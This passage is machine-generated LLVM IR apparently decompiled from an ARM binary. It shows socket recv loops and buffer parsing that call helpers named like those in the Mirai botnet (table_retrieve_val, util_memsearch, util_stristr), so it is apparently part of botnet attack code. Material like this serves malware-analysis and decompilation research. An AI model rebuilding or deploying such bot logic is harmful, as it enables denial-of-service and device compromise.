  %v1_8d6c = add i32 %v0_8d60, 2116
  store i32 %v1_8d6c, i32* @r7, align 4
  br i1 %v7_8d64, label %dec_label_pc_8e70, label %dec_label_pc_8d74

dec_label_pc_8d74:                                ; preds = %dec_label_pc_8d58, %dec_label_pc_8e70, %dec_label_pc_8e64
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8d78 = load i32, i32* %fp.global-to-local, align 4
  %v2_8d78 = inttoptr i32 %v1_8d78 to i32*
  store i32 0, i32* %v2_8d78, align 4
  %v0_8d7c = load i32, i32* @sl, align 4
  %v1_8d7c = add i32 %v0_8d7c, 660
  %v2_8d7c = inttoptr i32 %v1_8d7c to i32*
  %v3_8d7c = load i32, i32* %v2_8d7c, align 4
  store i32 %v3_8d7c, i32* %r1.global-to-local, align 4
  %v1_8d80 = add i32 %v0_8d7c, -1452
  %v2_8d80 = inttoptr i32 %v1_8d80 to i32*
  %v3_8d80 = load i32, i32* %v2_8d80, align 4
  store i32 %v3_8d80, i32* %r0.global-to-local, align 4
  %v1_8d84 = sub i32 1024, %v3_8d7c
  store i32 %v1_8d84, i32* %r2.global-to-local, align 4
  %v0_8d88 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d88 = add i32 %v0_8d88, 16384
  store i32 %v1_8d88, i32* %r3.global-to-local, align 4
  %v0_8d8c = load i32, i32* @r7, align 4
  %v2_8d8c = add i32 %v0_8d8c, %v3_8d7c
  store i32 %v2_8d8c, i32* %r1.global-to-local, align 4
  %v4_8d90 = call i32 @__libc_recv(i32 %v3_8d80, i32 %v2_8d8c, i32 %v1_8d84, i32 %v1_8d88)
  store i32 %v4_8d90, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8d94 = icmp eq i32 %v4_8d90, 0
  store i1 %v2_8d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8d94, label %dec_label_pc_96cc, label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8d74
  %v2_8d9c = icmp eq i32 %v4_8d90, -1
  store i1 %v2_8d9c, i1* %cpsr_c.global-to-local, align 1
  %v7_8d9c = icmp eq i32 %v4_8d90, -1
  store i1 %v7_8d9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8d9c, label %dec_label_pc_96f0, label %dec_label_pc_8da4

dec_label_pc_8da4:                                ; preds = %dec_label_pc_8d9c
  %v0_8da4 = load i32, i32* @sl, align 4
  %v1_8da4 = add i32 %v0_8da4, 660
  %v2_8da4 = inttoptr i32 %v1_8da4 to i32*
  %v3_8da4 = load i32, i32* %v2_8da4, align 4
  store i32 %v2_879c, i32* %r1.global-to-local, align 4
  %v2_8dac = add i32 %v3_8da4, %v4_8d90
  store i32 %v2_8dac, i32* @r4, align 4
  store i32 %v2_8dac, i32* %v2_8da4, align 4
  %v0_8db4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8db4 = load i32, i32* @sl, align 4
  %v2_8db4 = add i32 %v1_8db4, -1444
  %v3_8db4 = inttoptr i32 %v2_8db4 to i32*
  store i32 %v0_8db4, i32* %v3_8db4, align 4
  br label %dec_label_pc_8e44

dec_label_pc_8dbc:                                ; preds = %dec_label_pc_8e44
  %v1_8dbc = inttoptr i32 %v0_8e44 to i32*
  %v2_8dbc = load i32, i32* %v1_8dbc, align 4
  store i32 %v2_8dbc, i32* @r8, align 4
  %v1_8dc0 = load i32, i32* @r4, align 4
  %v5_8dc4 = icmp slt i32 %v3_8e44, %v1_8dc0
  %storemerge49 = select i1 %v5_8dc4, i32 %v3_8e44, i32 %v1_8dc0
  store i32 %storemerge49, i32* @r6, align 4
  %v2_8dcc = sub i32 %v3_8e44, %storemerge49
  store i32 %v2_8dcc, i32* %r3.global-to-local, align 4
  %v2_8dd0 = icmp ne i32 %v2_8dbc, 0
  store i1 %v2_8dd0, i1* %cpsr_c.global-to-local, align 1
  %v7_8dd0 = icmp eq i32 %v2_8dbc, 1
  store i1 %v7_8dd0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8dcc, i32* %v2_8e44, align 4
  br i1 %v7_8dd0, label %dec_label_pc_8e94, label %.dec_label_pc_8de0thread-pre-split_crit_edge

.dec_label_pc_8de0thread-pre-split_crit_edge:     ; preds = %dec_label_pc_8dbc
  %v1_8dd8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_8dd8, i32* @r5, align 4
  br label %dec_label_pc_8de0

dec_label_pc_8de0:                                ; preds = %dec_label_pc_8e50, %.dec_label_pc_8de0thread-pre-split_crit_edge, %dec_label_pc_8ebc
  %v0_8de0 = phi i32 [ %v3_8ebc, %dec_label_pc_8ebc ], [ %v1_8dd8, %.dec_label_pc_8de0thread-pre-split_crit_edge ], [ %v3_8e44, %dec_label_pc_8e50 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8de0 = icmp eq i32 %v0_8de0, 0
  store i1 %v2_8de0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8de0, label %dec_label_pc_8de8, label %dec_label_pc_8e08

dec_label_pc_8de8:                                ; preds = %dec_label_pc_8de0
  %v0_8de8 = load i32, i32* @sl, align 4
  %v1_8de8 = add i32 %v0_8de8, 8
  %v2_8de8 = inttoptr i32 %v1_8de8 to i32*
  %v3_8de8 = load i32, i32* %v2_8de8, align 4
  store i32 %v3_8de8, i32* @r4, align 4
  %v2_8dec = icmp ne i32 %v3_8de8, 0
  store i1 %v2_8dec, i1* %cpsr_c.global-to-local, align 1
  %v7_8dec = icmp eq i32 %v3_8de8, 1
  store i1 %v7_8dec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dec, label %dec_label_pc_8ec4, label %dec_label_pc_8df4

dec_label_pc_8df4:                                ; preds = %dec_label_pc_8de8
  %v1_8df4 = add i32 %v0_8de8, 660
  %v2_8df4 = inttoptr i32 %v1_8df4 to i32*
  %v3_8df4 = load i32, i32* %v2_8df4, align 4
  %v0_8df8 = load i32, i32* @r6, align 4
  %v2_8df8 = sub i32 %v3_8df4, %v0_8df8
  store i32 %v2_8df8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8dfc = icmp eq i32 %v2_8df8, 0
  store i1 %v2_8dfc, i1* %cpsr_z.global-to-local, align 1
  %v2_8e00 = add i32 %v0_8de8, 12
  %v3_8e00 = inttoptr i32 %v2_8e00 to i32*
  store i32 %v2_8df8, i32* %v3_8e00, align 4
  br i1 %v2_8dfc, label %dec_label_pc_96b0, label %dec_label_pc_8e08

dec_label_pc_8e08:                                ; preds = %dec_label_pc_8de0, %dec_label_pc_8ec4, %dec_label_pc_8df4, %dec_label_pc_8f4c
  %v0_8e08 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e08 = icmp eq i32 %v0_8e08, 0
  store i1 %v2_8e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e08, label %dec_label_pc_8e58, label %dec_label_pc_8e10

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8e08
  %v0_8e10 = load i32, i32* @sl, align 4
  %v1_8e10 = add i32 %v0_8e10, 660
  %v2_8e10 = inttoptr i32 %v1_8e10 to i32*
  %v3_8e10 = load i32, i32* %v2_8e10, align 4
  store i32 %v3_8e10, i32* @r3, align 4
  %v2_8e14 = sub i32 %v3_8e10, %v0_8e08
  store i32 %v2_8e14, i32* @r4, align 4
  store i32 %v2_8e14, i32* @r2, align 4
  store i32 %v2_8e14, i32* %v2_8e10, align 4
  %v0_8e20 = load i32, i32* @r7, align 4
  %v1_8e20 = load i32, i32* @r6, align 4
  %v2_8e20 = add i32 %v1_8e20, %v0_8e20
  store i32 %v2_8e20, i32* @r1, align 4
  store i32 %v0_8e20, i32* @r0, align 4
  %v3_8e28 = call i32 @memmove(i32 %v0_8e20, i32 %v2_8e20, i32 %v2_8e14)
  store i32 %v3_8e28, i32* %r0.global-to-local, align 4
  %v0_8e2c = load i32, i32* @sl, align 4
  %v1_8e2c = add i32 %v0_8e2c, 660
  %v2_8e2c = inttoptr i32 %v1_8e2c to i32*
  %v3_8e2c = load i32, i32* %v2_8e2c, align 4
  store i32 %v3_8e2c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8e34 = load i32, i32* %sb.global-to-local, align 4
  %v2_8e34 = add i32 %v0_8e34, %v3_8e2c
  store i32 %v2_8e34, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e38 = icmp eq i32 %v3_8e2c, 0
  store i1 %v2_8e38, i1* %cpsr_z.global-to-local, align 1
  %v3_8e3c = add i32 %v2_8e34, 2116
  %v4_8e3c = inttoptr i32 %v3_8e3c to i8*
  store i8 0, i8* %v4_8e3c, align 1
  %v0_8e40 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8e40, label %dec_label_pc_8e58, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8da4
  %v0_8e44 = load i32, i32* @sl, align 4
  %v1_8e44 = add i32 %v0_8e44, 12
  %v2_8e44 = inttoptr i32 %v1_8e44 to i32*
  %v3_8e44 = load i32, i32* %v2_8e44, align 4
  store i32 %v3_8e44, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e48 = icmp eq i32 %v3_8e44, 0
  store i1 %v2_8e48, i1* %cpsr_z.global-to-local, align 1
  %v5_8e4c = icmp sgt i32 %v3_8e44, 0
  br i1 %v5_8e4c, label %dec_label_pc_8dbc, label %dec_label_pc_8e50

dec_label_pc_8e50:                                ; preds = %dec_label_pc_8e44
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_8de0

dec_label_pc_8e58:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8e08
  %v0_8e58 = load i32, i32* @sl, align 4
  %v1_8e58 = add i32 %v0_8e58, -1448
  %v2_8e58 = inttoptr i32 %v1_8e58 to i8*
  %v3_8e58 = load i8, i8* %v2_8e58, align 1
  %v4_8e58 = zext i8 %v3_8e58 to i32
  store i32 %v4_8e58, i32* %r3.global-to-local, align 4
  %v2_8e5c = icmp ugt i8 %v3_8e58, 6
  store i1 %v2_8e5c, i1* %cpsr_c.global-to-local, align 1
  %v7_8e5c = icmp eq i8 %v3_8e58, 7
  store i1 %v7_8e5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e5c, label %dec_label_pc_8e64, label %dec_label_pc_87ec

dec_label_pc_8e64:                                ; preds = %dec_label_pc_8e58
  %v1_8e64 = add i32 %v0_8e58, 660
  %v2_8e64 = inttoptr i32 %v1_8e64 to i32*
  %v3_8e64 = load i32, i32* %v2_8e64, align 4
  store i32 %v3_8e64, i32* @r3, align 4
  %v2_8e68 = icmp ugt i32 %v3_8e64, 1023
  store i1 %v2_8e68, i1* %cpsr_c.global-to-local, align 1
  %v7_8e68 = icmp eq i32 %v3_8e64, 1024
  store i1 %v7_8e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e68, label %dec_label_pc_8e70.loopexit, label %dec_label_pc_8d74

dec_label_pc_8e70.loopexit:                       ; preds = %dec_label_pc_8e64
  %v0_8e70.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_8e78.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e70

dec_label_pc_8e70:                                ; preds = %dec_label_pc_8e70.loopexit, %dec_label_pc_8d58
  %v0_8e78 = phi i32 [ %v0_8e78.pre, %dec_label_pc_8e70.loopexit ], [ %v1_8d6c, %dec_label_pc_8d58 ]
  %v0_8e70 = phi i32 [ %v0_8e70.pre, %dec_label_pc_8e70.loopexit ], [ %v0_8d60, %dec_label_pc_8d58 ]
  %v1_8e74 = add i32 %v0_8e70, 2180
  store i32 %v1_8e74, i32* @r1, align 4
  store i32 %v0_8e78, i32* @r0, align 4
  store i32 960, i32* @r2, align 4
  %v3_8e80 = call i32 @memmove(i32 %v0_8e78, i32 %v1_8e74, i32 960)
  store i32 %v3_8e80, i32* %r0.global-to-local, align 4
  %v0_8e84 = load i32, i32* @sl, align 4
  %v1_8e84 = add i32 %v0_8e84, 660
  %v2_8e84 = inttoptr i32 %v1_8e84 to i32*
  %v3_8e84 = load i32, i32* %v2_8e84, align 4
  store i32 %v3_8e84, i32* %r3.global-to-local, align 4
  %v1_8e88 = add i32 %v3_8e84, -64
  store i32 %v1_8e88, i32* @r4, align 4
  store i32 %v1_8e88, i32* %v2_8e84, align 4
  br label %dec_label_pc_8d74

dec_label_pc_8e94:                                ; preds = %dec_label_pc_8dbc
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_8e9c = call i32 @table_retrieve_val(i32 39, i32* null)
  %v0_8ea0 = load i32, i32* @r4, align 4
  store i32 %v0_8ea0, i32* %r1.global-to-local, align 4
  store i32 %v3_8e9c, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_8eac = load i32, i32* @r7, align 4
  store i32 %v0_8eac, i32* %r0.global-to-local, align 4
  %v4_8eb0 = call i32 @util_memsearch(i32 %v0_8eac, i32 %v0_8ea0, i32 %v3_8e9c, i32 11)
  store i32 %v4_8eb0, i32* %r0.global-to-local, align 4
  %v3_8eb4 = icmp eq i32 %v4_8eb0, -1
  store i1 %v3_8eb4, i1* %cpsr_c.global-to-local, align 1
  %v8_8eb4 = icmp eq i32 %v4_8eb0, -1
  store i1 %v8_8eb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8eb4, label %dec_label_pc_8ebc, label %dec_label_pc_998c

dec_label_pc_8ebc:                                ; preds = %dec_label_pc_8e94
  %v0_8ebc = load i32, i32* @sl, align 4
  %v1_8ebc = add i32 %v0_8ebc, 12
  %v2_8ebc = inttoptr i32 %v1_8ebc to i32*
  %v3_8ebc = load i32, i32* %v2_8ebc, align 4
  store i32 %v3_8ebc, i32* @r5, align 4
  br label %dec_label_pc_8de0

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8de8
  %v0_8ec4 = load i32, i32* @r7, align 4
  store i32 %v0_8ec4, i32* %r0.global-to-local, align 4
  %v1_8ec8 = add i32 %v0_8de8, 660
  %v2_8ec8 = inttoptr i32 %v1_8ec8 to i32*
  %v3_8ec8 = load i32, i32* %v2_8ec8, align 4
  store i32 %v3_8ec8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8ed4 = call i32 @util_memsearch(i32 %v0_8ec4, i32 %v3_8ec8, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2)
  store i32 %v5_8ed4, i32* %r0.global-to-local, align 4
  %v2_8ed8 = icmp eq i32 %v5_8ed4, -1
  store i1 %v2_8ed8, i1* %cpsr_c.global-to-local, align 1
  %v7_8ed8 = icmp eq i32 %v5_8ed4, -1
  store i1 %v7_8ed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8ed8, label %dec_label_pc_8e08, label %dec_label_pc_8ee0

dec_label_pc_8ee0:                                ; preds = %dec_label_pc_8ec4
  %v0_8ee0 = load i32, i32* @sl, align 4
  %v1_8ee0 = add i32 %v0_8ee0, 660
  %v2_8ee0 = inttoptr i32 %v1_8ee0 to i32*
  %v3_8ee0 = load i32, i32* %v2_8ee0, align 4
  store i32 %v3_8ee0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_8eec = load i32, i32* @r7, align 4
  store i32 %v0_8eec, i32* %r0.global-to-local, align 4
  %v5_8ef0 = call i32 @util_memsearch(i32 %v0_8eec, i32 %v3_8ee0, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2)
  %v0_8ef4 = load i32, i32* %sb.global-to-local, align 4
  %v2_8ef4 = add i32 %v0_8ef4, %v5_8ef0
  store i32 %v2_8ef4, i32* %ip.global-to-local, align 4
  store i32 %v5_8ef0, i32* @r6, align 4
  store i32 %v5_8ef0, i32* %r1.global-to-local, align 4
  %v0_8f00 = load i32, i32* @r7, align 4
  store i32 %v0_8f00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b388.49 to i32), i32* %r2.global-to-local, align 4
  %v0_8f08 = load i32, i32* @r4, align 4
  store i32 %v0_8f08, i32* %r3.global-to-local, align 4
  %v0_8f0c = load i32, i32* @r5, align 4
  %v1_8f0c = trunc i32 %v0_8f0c to i8
  %v3_8f0c = add i32 %v2_8ef4, 2114
  %v4_8f0c = inttoptr i32 %v3_8f0c to i8*
  store i8 %v1_8f0c, i8* %v4_8f0c, align 1
  %v4_8f10 = call i32 @util_memsearch(i32 %v0_8f00, i32 %v5_8ef0, i32 ptrtoint (i32* @global_var_1b388.49 to i32), i32 %v0_8f08)
  store i32 %v4_8f10, i32* %r0.global-to-local, align 4
  %v2_8f14 = icmp eq i32 %v4_8f10, -1
  store i1 %v2_8f14, i1* %cpsr_c.global-to-local, align 1
  %v7_8f14 = icmp eq i32 %v4_8f10, -1
  store i1 %v7_8f14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8f14, label %dec_label_pc_8f38, label %dec_label_pc_8f1c

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ee0
  %v0_8f1c = load i32, i32* @r7, align 4
  store i32 %v0_8f1c, i32* %r0.global-to-local, align 4
  %v0_8f20 = load i32, i32* @r6, align 4
  store i32 %v0_8f20, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b388.49 to i32), i32* %r2.global-to-local, align 4
  %v0_8f28 = load i32, i32* @r4, align 4
  store i32 %v0_8f28, i32* %r3.global-to-local, align 4
  %v4_8f2c = call i32 @util_memsearch(i32 %v0_8f1c, i32 %v0_8f20, i32 ptrtoint (i32* @global_var_1b388.49 to i32), i32 %v0_8f28)
  %v0_8f30 = load i32, i32* %sb.global-to-local, align 4
  %v2_8f30 = add i32 %v0_8f30, %v4_8f2c
  store i32 %v2_8f30, i32* %r0.global-to-local, align 4
  %v0_8f34 = load i32, i32* @r5, align 4
  %v1_8f34 = trunc i32 %v0_8f34 to i8
  %v3_8f34 = add i32 %v2_8f30, 2116
  %v4_8f34 = inttoptr i32 %v3_8f34 to i8*
  store i8 %v1_8f34, i8* %v4_8f34, align 1
  br label %dec_label_pc_8f38

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8ee0, %dec_label_pc_8f1c
  %v0_8f38 = load i32, i32* @r7, align 4
  store i32 %v0_8f38, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_8f40 = inttoptr i32 %v0_8f38 to i8*
  %v3_8f40 = call i32 @util_atoi(i8* %v2_8f40, i32 16)
  store i32 %v3_8f40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8f44 = icmp eq i32 %v3_8f40, 0
  store i1 %v2_8f44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f44, label %dec_label_pc_9b40, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f38
  %v1_8f4c = add i32 %v3_8f40, 2
  store i32 %v1_8f4c, i32* %r3.global-to-local, align 4
  %v1_8f50 = load i32, i32* @sl, align 4
  %v2_8f50 = add i32 %v1_8f50, 12
  %v3_8f50 = inttoptr i32 %v2_8f50 to i32*
  store i32 %v1_8f4c, i32* %v3_8f50, align 4
  br label %dec_label_pc_8e08

dec_label_pc_8f58:                                ; preds = %dec_label_pc_85c4
  %v2_8f58 = inttoptr i32 %v1_8618 to i32*
  %v3_8f58 = load i32, i32* %v2_8f58, align 4
  store i32 %v3_8f58, i32* %ip.global-to-local, align 4
  %v3_8f60 = udiv i32 %v3_8f58, 32
  %v3_8f64 = mul nuw nsw i32 %v3_8f60, 4
  store i32 %v2_8710, i32* @lr, align 4
  %v2_8f6c = add i32 %v3_8f64, %v2_8710
  store i32 %v2_8f6c, i32* %r2.global-to-local, align 4
  %v1_8f70 = add i32 %v2_8f6c, -164
  %v2_8f70 = inttoptr i32 %v1_8f70 to i32*
  %v3_8f70 = load i32, i32* %v2_8f70, align 4
  %v1_8f74 = urem i32 %v3_8f58, 32
  store i32 %v1_8f74, i32* %r0.global-to-local, align 4
  store i32 %v1_85bc, i32* %r3.global-to-local, align 4
  %v7_8f7c = shl i32 %v1_85bc, %v1_8f74
  %v8_8f7c = or i32 %v3_8f70, %v7_8f7c
  store i32 %v8_8f7c, i32* @r1, align 4
  %v1_8f80 = load i32, i32* @r8, align 4
  %v2_8f80 = sub i32 %v3_8f58, %v1_8f80
  %v3_8f80 = icmp uge i32 %v3_8f58, %v1_8f80
  store i1 %v3_8f80, i1* %cpsr_c.global-to-local, align 1
  %v4_8f80 = xor i32 %v1_8f80, %v3_8f58
  %v5_8f80 = xor i32 %v2_8f80, %v3_8f58
  %v6_8f80 = and i32 %v5_8f80, %v4_8f80
  %v7_8f80 = icmp slt i32 %v6_8f80, 0
  %v8_8f80 = icmp slt i32 %v2_8f80, 0
  %v9_8f80 = icmp eq i32 %v3_8f58, %v1_8f80
  store i1 %v9_8f80, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8f7c, i32* %v2_8f70, align 4
  %v3_8f88 = xor i1 %v8_8f80, %v7_8f80
  %v4_8f88 = or i1 %v9_8f80, %v3_8f88
  br i1 %v4_8f88, label %dec_label_pc_85f4, label %dec_label_pc_8f8c

dec_label_pc_8f8c:                                ; preds = %dec_label_pc_8f58
  %v0_8f8c = load i32, i32* %ip.global-to-local, align 4
  %v1_8f8c = load i32, i32* %r3.global-to-local, align 4
  %v2_8f8c = add i32 %v1_8f8c, %v0_8f8c
  store i32 %v2_8f8c, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_8f94:                                ; preds = %dec_label_pc_8848
  store i32 %v3_888c, i32* %r0.global-to-local, align 4
  %v1_8f98 = call i32 @__GI___libc_close(i32 %v3_888c)
  store i32 %v1_8f98, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_8fa0 = load i32, i32* @sl, align 4
  %v2_8fa0 = add i32 %v1_8fa0, -1452
  %v3_8fa0 = inttoptr i32 %v2_8fa0 to i32*
  store i32 -1, i32* %v3_8fa0, align 4
  %v0_8fa4 = load i32, i32* @r5, align 4
  %v1_8fa4 = trunc i32 %v0_8fa4 to i8
  %v2_8fa4 = load i32, i32* @sl, align 4
  %v3_8fa4 = add i32 %v2_8fa4, -1448
  %v4_8fa4 = inttoptr i32 %v3_8fa4 to i8*
  store i8 %v1_8fa4, i8* %v4_8fa4, align 1
  br label %dec_label_pc_87ec

dec_label_pc_8fac:                                ; preds = %dec_label_pc_85cc
  %v2_8fac = inttoptr i32 %v1_8618 to i32*
  %v3_8fac = load i32, i32* %v2_8fac, align 4
  store i32 %v3_8fac, i32* %ip.global-to-local, align 4
  %v3_8fb4 = udiv i32 %v3_8fac, 32
  store i32 %v2_8710, i32* %r1.global-to-local, align 4
  %v3_8fbc = mul nuw nsw i32 %v3_8fb4, 4
  %v2_8fc0 = add i32 %v3_8fbc, %v2_8710
  store i32 %v2_8fc0, i32* %r2.global-to-local, align 4
  %v1_8fc4 = add i32 %v2_8fc0, -164
  %v2_8fc4 = inttoptr i32 %v1_8fc4 to i32*
  %v3_8fc4 = load i32, i32* %v2_8fc4, align 4
  %v1_8fc8 = urem i32 %v3_8fac, 32
  store i32 %v1_8fc8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8fd0 = shl i32 1, %v1_8fc8
  %v8_8fd0 = or i32 %v3_8fc4, %v7_8fd0
  store i32 %v8_8fd0, i32* @r1, align 4
  %v1_8fd4 = load i32, i32* @r8, align 4
  %v2_8fd4 = sub i32 %v3_8fac, %v1_8fd4
  %v3_8fd4 = icmp uge i32 %v3_8fac, %v1_8fd4
  store i1 %v3_8fd4, i1* %cpsr_c.global-to-local, align 1
  %v4_8fd4 = xor i32 %v1_8fd4, %v3_8fac
  %v5_8fd4 = xor i32 %v2_8fd4, %v3_8fac
  %v6_8fd4 = and i32 %v5_8fd4, %v4_8fd4
  %v7_8fd4 = icmp slt i32 %v6_8fd4, 0
  %v8_8fd4 = icmp slt i32 %v2_8fd4, 0
  %v9_8fd4 = icmp eq i32 %v3_8fac, %v1_8fd4
  store i1 %v9_8fd4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8fd0, i32* %v2_8fc4, align 4
  %v3_8fdc = xor i1 %v8_8fd4, %v7_8fd4
  %v4_8fdc = or i1 %v9_8fd4, %v3_8fdc
  br i1 %v4_8fdc, label %dec_label_pc_85f4, label %dec_label_pc_8fe0

dec_label_pc_8fe0:                                ; preds = %dec_label_pc_8fac
  %v0_8fe0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8fe0 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fe0 = add i32 %v1_8fe0, %v0_8fe0
  store i32 %v2_8fe0, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_9028:                                ; preds = %dec_label_pc_87d0
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_9030 = call i32 @util_zero(i32 %v2_827c, i32 10240)
  store i32 %v2_9030, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_903c = load i32, i32* @sl, align 4
  %v1_903c = add i32 %v0_903c, -1452
  %v2_903c = inttoptr i32 %v1_903c to i32*
  %v3_903c = load i32, i32* %v2_903c, align 4
  store i32 %v3_903c, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v4_9048 = call i32 @__libc_recv(i32 %v3_903c, i32 %v2_827c, i32 10240, i32 16386)
  store i32 %v4_9048, i32* %r0.global-to-local, align 4
  store i32 %v4_9048, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9050 = icmp eq i32 %v4_9048, 0
  store i1 %v2_9050, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r7, align 4
  %tmp181 = icmp slt i32 %v4_9048, 1
  br i1 %tmp181, label %dec_label_pc_9550, label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9028
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  store i32 %v4_9048, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b380.51 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_906c = call i32 @util_memsearch(i32 %v2_827c, i32 %v4_9048, i32 ptrtoint ([5 x i8]* @global_var_1b380.51 to i32), i32 4)
  store i32 %v5_906c, i32* %r0.global-to-local, align 4
  %v3_9070 = icmp eq i32 %v5_906c, -1
  store i1 %v3_9070, i1* %cpsr_c.global-to-local, align 1
  %v8_9070 = icmp eq i32 %v5_906c, -1
  store i1 %v8_9070, i1* %cpsr_z.global-to-local, align 1
  %v0_9078 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v3_9070, label %dec_label_pc_9078, label %dec_label_pc_9080

dec_label_pc_9078:                                ; preds = %dec_label_pc_905c
  %v3_9078 = icmp ugt i32 %v0_9078, 10239
  store i1 %v3_9078, i1* %cpsr_c.global-to-local, align 1
  %v8_9078 = icmp eq i32 %v0_9078, 10240
  store i1 %v8_9078, i1* %cpsr_z.global-to-local, align 1
  %v5_907c = icmp slt i32 %v0_9078, 10240
  br i1 %v5_907c, label %dec_label_pc_87ec, label %dec_label_pc_9080

dec_label_pc_9080:                                ; preds = %dec_label_pc_905c, %dec_label_pc_9078
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b380.51 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_9078, i32* %r1.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v5_9090 = call i32 @util_memsearch(i32 %v2_827c, i32 %v0_9078, i32 ptrtoint ([5 x i8]* @global_var_1b380.51 to i32), i32 4)
  store i32 %v2_827c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v4_909c = add i32 %v5_9090, %v2_827c
  %v5_909c = inttoptr i32 %v4_909c to i8*
  store i8 0, i8* %v5_909c, align 1
  %v0_90a0 = load i32, i32* @r5, align 4
  store i32 %v0_90a0, i32* %r1.global-to-local, align 4
  store i32 49, i32* %r0.global-to-local, align 4
  %v2_90a8 = inttoptr i32 %v0_90a0 to i32*
  %v3_90a8 = call i32 @table_retrieve_val(i32 49, i32* %v2_90a8)
  %v0_90ac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_90ac, i32* @r1, align 4
  store i32 %v3_90a8, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_90b8 = call i32 @util_stristr(i8* %tmp168, i32 %v0_90ac, i32 %v3_90a8)
  store i32 %v4_90b8, i32* %r0.global-to-local, align 4
  %v2_90bc = icmp eq i32 %v4_90b8, -1
  store i1 %v2_90bc, i1* %cpsr_c.global-to-local, align 1
  %v7_90bc = icmp eq i32 %v4_90b8, -1
  store i1 %v7_90bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90bc, label %.thread23, label %bb182

bb182:                                            ; preds = %dec_label_pc_9080
  store i32 2, i32* %r3.global-to-local, align 4
